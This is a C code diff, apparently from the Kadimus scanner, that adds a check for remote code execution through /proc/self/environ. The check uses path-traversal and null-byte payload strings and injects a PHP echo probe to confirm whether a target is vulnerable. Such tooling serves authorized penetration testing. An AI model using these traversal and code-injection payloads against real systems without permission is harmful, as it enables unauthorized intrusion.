@@ -135,10 +135,44 @@ void expect_scan(url_t *url, int pos)
 	xinfo("expect://cmd test finish\n");
 }
 
+void proc_env_scan(url_t *url, int pos)
+{
+	static const char *environ[] = {
+		"/proc/self/environ",
+		"../../../../../../../../../../../proc/self/environ",
+		"/proc/self/environ%00",
+		"../../../../../../../../../../../proc/self/environ%00",
+		NULL
+	};
+
+	int skip = 0;
+
+	xinfo("testing /proc/self/environ rce ...\n");
+
+	for (int i = 0; !skip && environ[i]; i++) {
+		char *target = buildurl(url, string_replace, environ[i], pos);
+		xinfo("requesting: %s\n", target);
+
+		char *rce = proc_env_rce(target, "<?php echo 'vulnerable'; ?>");
+		if (rce && !strcmp(rce, "vulnerable")) {
+			xgood("target vulnerable: %s\n", target);
+			skip = 1;
+
+		}
+
+		free(rce);
+		free(target);
+	}
+
+	if (!skip) xwarn("probably not vulnerable\n");
+	xinfo("/proc/self/environ test finish\n");
+}
+
 void kadimus_rce_scan(url_t *url, int pos)
 {
 	php_input_scan(url, pos);
 	data_wrap_scan(url, pos);
 	auth_log_scan(url, pos);
 	expect_scan(url, pos);
+	proc_env_scan(url, pos);
 }
